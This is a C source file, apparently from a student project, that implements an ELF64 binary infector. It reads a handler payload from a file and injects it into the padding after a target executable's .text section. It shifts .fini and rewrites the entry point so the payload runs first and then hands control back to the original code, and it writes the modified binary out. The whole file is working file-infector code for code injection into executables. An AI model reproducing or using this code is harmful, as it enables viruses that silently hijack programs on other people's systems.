/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   elf64.c                                            :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: jdecorte42 <jdecorte42@student.42.fr>      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2023/11/07 12:37:51 by mbucci            #+#    #+#             */
/*   Updated: 2023/11/20 16:29:38 by mbucci           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <elf.h>
#include <fcntl.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include "infector.h"

#define PAGE_ALIGN_UP(X, Y) (((Y) != 0) ? (((X) + (Y) - 1) / (Y) * (Y)) : (X))

/* Global Variables */
static Elf64_Addr g_handler_addr = 0;
static Elf64_Off g_handler_off = 0;
static uint64_t g_handler_size = 0;

/* CODE */
static int check_boundaries(const t_target *target)
{
    Elf64_Ehdr *elf = (Elf64_Ehdr *)target->base;

    if ((elf->e_shoff + (elf->e_shentsize * elf->e_shnum) > target->filesz)
            || (elf->e_phoff + (elf->e_phentsize * elf->e_phnum) > target->filesz)
       )
        return 1;

    return 0;
}

static void patch_fini_symbol(Elf64_Ehdr *elf, Elf64_Off old_fini, Elf64_Off new_fini)
{
    const Elf64_Shdr *sh = (void *)elf + elf->e_shoff;
    const Elf64_Shdr *sym_sect = NULL;

    // find symbol table
    for (uint16_t i = 0; i < elf->e_shnum; ++i)
    {
        if (sh[i].sh_type == SHT_SYMTAB)
        {
            sym_sect = &sh[i];
            break;
        }
    }

    // return if the file doesn't contain any symbols
    if (!sym_sect)
        return;

    // find _fini symbol in symbol table
    Elf64_Sym *sym = (void *)elf + sym_sect->sh_offset;
    const uint64_t sym_num = sym_sect->sh_size / sym_sect->sh_entsize;
    for (uint64_t s = 0; s < sym_num; ++s)
    {
        // patch _fini symbol value
        if (sym[s].st_value == old_fini)
        {
            sym[s].st_value = new_fini;
            return;
        }
    }
}

static uint8_t perform_injection(Elf64_Ehdr *elf, void *handler)
{
    Elf64_Phdr *ph_tab = (Elf64_Phdr *)((void *)elf + elf->e_phoff);
    Elf64_Shdr *sh_tab = (Elf64_Shdr *)((void *)elf + elf->e_shoff);
    Elf64_Off original_fini_off, aligned_fini_off;
    uint64_t padding = 0;
    uint8_t patched = 0;

    for (uint16_t i = 0; i < elf->e_phnum && !patched; ++i)
    {
        if (ph_tab[i].p_type == PT_LOAD && ph_tab[i].p_flags == (PF_R | PF_X))
        {
            if (i < elf->e_phnum) // ph_tab[TEXT] is not the last segment
                padding = ph_tab[i + 1].p_offset - (ph_tab[i].p_offset + ph_tab[i].p_filesz);
            else // ph_tab[TEXT] is the last segment
                padding = elf->e_shoff - (ph_tab[i].p_offset + ph_tab[i].p_filesz); // TODO: make room by shifting shdr
            if (padding < g_handler_size)
                return write_error(NULL, PADD_ERR);

            for (uint16_t fini = 0; fini < elf->e_shnum && !patched; ++fini)
            {
                // find .fini section
                if ((sh_tab[fini].sh_offset + sh_tab[fini].sh_size) == (ph_tab[i].p_offset + ph_tab[i].p_filesz))
                {
                    // find .text section
                    for (uint16_t text = 0; text < elf->e_shnum && !patched; ++text)
                    {
                        // technically, the first section before .fini
                        // ---> TODO: use string table to find actual .text and .fini sections
                        if ((PAGE_ALIGN_UP(sh_tab[text].sh_offset + sh_tab[text].sh_size, sh_tab[fini].sh_addralign)) == sh_tab[fini].sh_offset)
                        {
                            g_handler_addr = sh_tab[text].sh_addr + sh_tab[text].sh_size;
                            g_handler_off = sh_tab[text].sh_offset + sh_tab[text].sh_size;

                            // patch entry to land handler (== end of .text)
                            Elf64_Addr code_entry = elf->e_entry;
                            if (elf->e_type == ET_EXEC)
                            {
                                elf->e_entry = g_handler_addr;
                                patch_payload_addr64(handler, g_handler_size, 0xAAAAAAAAAAAAAAAA, 0);
                            }
                            else
                            {
                                elf->e_entry = g_handler_off;
                                patch_payload_addr64(handler, g_handler_size, 0xAAAAAAAAAAAAAAAA, 1);
                            }
                            patch_payload_addr64(handler, g_handler_size, 0x3333333333333333, code_entry); // return controlflow

                            aligned_fini_off = PAGE_ALIGN_UP(sh_tab[text].sh_offset + sh_tab[text].sh_size + g_handler_size, sh_tab[fini].sh_addralign);

                            // shift contents of .fini
                            memmove((void *)elf + aligned_fini_off, (void*)elf + sh_tab[fini].sh_offset, sh_tab[fini].sh_size);

                            // write handler after original .text
                            memmove((void*)elf + g_handler_off, handler, g_handler_size);

                            original_fini_off = sh_tab[fini].sh_offset;

                            // patch _fini symbol
                            patch_fini_symbol(elf, original_fini_off, aligned_fini_off);

                            // inc segment size
                            ph_tab[i].p_filesz = ph_tab[i].p_filesz - original_fini_off + aligned_fini_off;
                            ph_tab[i].p_memsz = ph_tab[i].p_filesz;

                            // inc offset of .fini shdr
                            sh_tab[fini].sh_offset = aligned_fini_off;
                            sh_tab[fini].sh_addr = PAGE_ALIGN_UP(sh_tab[text].sh_addr + sh_tab[text].sh_size + g_handler_size, sh_tab[fini].sh_addralign);

                            // inc size of .text
                            sh_tab[text].sh_size += g_handler_size;

                            patched = 1;
                        }
                    }
                }
            }
        }
    }

    if (!patched)
        return 1;

    // patch dynamic section, if it's there
    for (uint16_t i = 0; i < elf->e_phnum; ++i)
    {
        if (ph_tab[i].p_type == PT_DYNAMIC)
        {
            patch_payload_addr64((void*)elf + ph_tab[i].p_offset, ph_tab[i].p_filesz, original_fini_off, aligned_fini_off);
        }
    }

    return 0;
}

int infect_elf64(t_target *target)
{
    if (check_boundaries(target))
        return write_error(target->filename, CORRUPT_ERR);

    // get injection handler
    void *handler = read_file(HANDLER_ELF64_PATH, &g_handler_size);
    if (!handler)
        return 1;

    // prepare for injection
    Elf64_Ehdr *elf = (Elf64_Ehdr *)target->base;
    if (perform_injection(elf, handler))
        return 1;

    free(handler);

    // create patch
    int patch_fd = -1;
    if ((patch_fd = open(PATCH, (O_CREAT | O_WRONLY | O_TRUNC), 0755)) == -1)
        return write_error(PATCH, NULL);

    // dump file into patch
    int ret = 0;
    if (write(patch_fd, target->base, target->filesz) == -1)
        ret = write_error(PATCH, NULL);

    close(patch_fd);

    return ret;
}
